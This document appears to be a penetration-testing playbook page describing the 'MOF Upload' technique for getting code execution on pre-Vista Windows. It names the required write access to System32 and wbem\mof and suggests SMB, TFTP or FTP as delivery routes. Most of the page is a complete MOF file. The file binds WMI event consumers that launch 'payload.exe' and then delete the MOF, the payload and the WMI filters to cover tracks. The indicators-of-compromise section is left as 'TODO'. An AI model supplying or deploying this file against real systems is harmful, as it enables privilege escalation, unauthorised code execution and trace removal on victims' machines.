# MOF Upload
## Summary

Pre-Windows Vista (Not including vista) have an interesting vulnerability that can be used to gain code execution when two files are written to specific directories using any method. There might be a way of using this Post-Windows Vista, but they don't get auto-compiled anymore. More research is needed.

## Prerequisites

A Pre-Windows Vista install is required, and some method of writing to both "C:\\Windows\\System32" and "C:\\Windows\\System32\\wbem\\mof" is required for this exploit.

## Setup

Pick any method of allowing the attacker to write to the "C:\\Windows\\System32" and "C:\\Windows\\System32\\wbem\\mof" folders. This exploit can be used as privilege escalation or as initial access. SMB, TFTP, FTP, etc, are all viable setups.

## Execution

### Method 1 - Auto-compiling MOF

The first step is to upload the intended binary to "C:\\Windows\\System32", and then to upload a custom MOF file to "C:\\Windows\\System32\\wbem\\mof". Replace any instance of "payload.exe" below with the name of the executable uploaded. Below is the file that should be uploaded to the MOF directory:

```mof
#pragma namespace("\\\\.\\root\\cimv2")
class MyClass89
{
	[key] string Name;
};
class ActiveScriptEventConsumer : __EventConsumer
{
	[key] string Name;
	[not_null] string ScriptingEngine;
	string ScriptFileName;
	[template] string ScriptText;
	uint32 KillTimeout;
};
instance of __Win32Provider as $P
{
	Name  = "ActiveScriptEventConsumer";
	CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
	PerUserInitialization = TRUE;
};
instance of __EventConsumerProviderRegistration
{
	Provider = $P;
	ConsumerClassNames = {"ActiveScriptEventConsumer"};
};
Instance of ActiveScriptEventConsumer as $cons
{
	Name = "ASEC";
	ScriptingEngine = "JScript";
	ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"payload.exe\");} catch (err) {};\nsv = GetObject(\"winmgmts:root\\\\cimv2\");try {sv.Delete(\"MyClass89\");} catch (err) {};try {sv.Delete(\"__EventFilter.Name='instfilt'\");} catch (err) {};try {sv.Delete(\"ActiveScriptEventConsumer.Name='ASEC'\");} catch(err) {};";
	
};
Instance of ActiveScriptEventConsumer as $cons2
{
	Name = "qndASEC";
	ScriptingEngine = "JScript";
	ScriptText = "\nvar objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\ntry {var f1 = objfs.GetFile(\"wbem\\\\mof\\\\good\\\\baud.mof\");\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\"payload.exe\");\nf2.Delete(true);\nvar s = GetObject(\"winmgmts:root\\\\cimv2\");s.Delete(\"__EventFilter.Name='qndfilt'\");s.Delete(\"ActiveScriptEventConsumer.Name='qndASEC'\");\n} catch(err) {};";
};
instance of __EventFilter as $Filt
{
	Name = "instfilt";
	Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClass89\"";
	QueryLanguage = "WQL";
};
instance of __EventFilter as $Filt2
{
	Name = "qndfilt";
	Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"payload.exe\"";
	QueryLanguage = "WQL";
	
};
instance of __FilterToConsumerBinding as $bind
{
	Consumer = $cons;
	Filter = $Filt;
};
instance of __FilterToConsumerBinding as $bind2
{
	Consumer = $cons2;
	Filter = $Filt2;
};
instance of MyClass89 as $MyClass
{
	Name = "ClassConsumer";
};
```

Once this file is uploaded, then the exe that was uploaded should get executed.

#### Indicators of Compromise

TODO
